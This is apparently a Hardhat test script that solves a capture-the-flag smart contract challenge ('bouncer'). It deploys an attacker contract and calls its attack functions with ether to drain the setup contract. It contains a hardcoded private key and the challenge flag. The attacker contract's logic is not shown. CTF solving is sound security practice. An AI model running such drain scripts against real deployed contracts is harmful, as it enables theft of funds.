import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x0ae7961195e2c64febb1d05f857e8b9b509f236f04ab0fd78d765ff1031a7282`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/bouncer/public/contracts/Setup.sol:Setup`,
    `0xac18ddC87dc29392265b8D778299996fBC9f59cD`,
    eoa,
    { value: ethers.utils.parseEther(`100`) }
  );
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(`BouncerAttacker`, eoa);
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`5`)})
  await tx.wait()

  tx = await attacker.attack2({ value: ethers.utils.parseEther(`4990`)})
  await tx.wait()

  // PCTF{SH0ULDV3_US3D_W37H}
});
